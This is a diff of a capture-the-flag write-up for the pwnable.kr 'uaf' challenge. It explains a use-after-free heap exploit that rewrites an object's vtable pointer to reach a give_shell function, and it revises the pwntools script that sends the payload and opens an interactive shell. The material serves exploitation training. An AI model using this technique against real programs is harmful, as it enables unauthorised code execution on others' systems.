@@ -28,28 +28,22 @@ give_shell takes the place of introduce as second function :
 new_vtable_1F =  old_vtable_1F-8
 ```
 Now let's write our new vtable address into a file, so the content of the file will be stored in the heap chunk containing our objects' vtable. When we debug the binary, we clearly see that this chunk is located after another chunk of 0x30 containing the object's name and age variables, and its size is 0x20. That is why we specified an 0x18 address: so doing, it will realign the 0x18 size to 0x20, and it will be looking for a free 0x20 chunk, then it will find chunks containing vtable (for ``w`` then for ``m``).
+
 ```python
 shell = ssh("uaf", "pwnable.kr", password="guest", port=2222)
-wp = shell.process(["cat", "/dev/stdin", ">>", "/tmp/payload"])
-wp.send(p64(new_vtable_1F))
-wp.close()
+p = shell.process(["./uaf", "24", "/dev/stdin"])
 
-p = shell.process(["./uaf", "24", "/tmp/payload"])
-print p.recv()
-p.sendline("3") 
-print p.recv()
-p.sendline("2") 
+p.sendline("3") ; p.recv()
+p.sendline("2")
+p.send(p64(new_vtable_1F)) ; p.recv()
+p.sendline("2") ; p.recv()
 ```
 It's the ``w`` heap chunk containing vtable that is going to be reused the first time. So we have to store the payload twice, since ``m->introduce`` is called before ``w->introduce``.
 ```python
-print p.recv()
-p.sendline("2")
-print p.recv()
-p.sendline("1")
-print p.recv()
+p.sendline("2") ; p.recv()
+p.sendline("1") ;p.recv()
 ```
 We got the shell.
 ```python
-p.sendline("cat flag")
-print p.recv()
+p.interactive()
 ```
